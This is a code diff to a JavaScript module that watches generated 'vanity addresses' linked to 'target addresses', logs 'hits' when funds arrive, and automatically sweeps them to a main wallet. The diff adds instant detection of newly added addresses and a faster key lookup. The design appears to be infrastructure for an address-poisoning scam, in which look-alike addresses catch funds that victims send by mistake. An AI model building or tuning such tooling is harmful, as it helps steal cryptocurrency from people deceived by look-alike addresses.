@@ -5,6 +5,7 @@ import { getVanityKey, listVanityAddresses } from '../tx/vault.js';
 import { sendTx } from '../tx/sender.js';
 import { sendHitAlert } from './alerts.js';
 import { saveHit, updateHitTransfer, updateVanityStatus, incrementDailyStat } from '../lib/db.js';
+import { onNewVanity } from '../lib/pubsub.js';
 
 const MAIN_WALLET = process.env.MAIN_WALLET;
 const POLL_INTERVAL = 5_000;  // 5s polling
@@ -34,7 +35,13 @@ export async function startDetector() {
   let watchedAddresses = await loadAddresses();
   console.log(`  Watching ${watchedAddresses.length} vanity addresses\n`);
 
-  // Refresh address list every 30s
+  // Instant notification when new vanity address is added (no 30s blind window)
+  await onNewVanity(async (vanityAddress) => {
+    console.log(`  [HitDetector] New vanity added: ${vanityAddress.slice(0, 10)}...`);
+    watchedAddresses = await loadAddresses();
+  });
+
+  // Periodic refresh as backup
   setInterval(async () => {
     watchedAddresses = await loadAddresses();
   }, 30_000);
@@ -164,15 +171,8 @@ async function checkBlock(provider, chainKey, blockNumber, getAddresses) {
  */
 async function autoTransfer(chainKey, vanityAddress, receivedValue, hitId) {
   try {
-    // Find the target address for this vanity
-    const entries = await listVanityAddresses();
-    const entry = entries.find((e) => e.vanityAddress.toLowerCase() === vanityAddress);
-    if (!entry) {
-      console.error(`  [AutoTransfer] No vault entry for ${vanityAddress}`);
-      return;
-    }
-
-    const vault = await getVanityKey(entry.targetAddress);
+    // Direct lookup by vanity address (O(1), not O(n))
+    const vault = await getVanityKey(vanityAddress);
     if (!vault) {
       console.error(`  [AutoTransfer] Cannot decrypt key for ${vanityAddress}`);
       return;
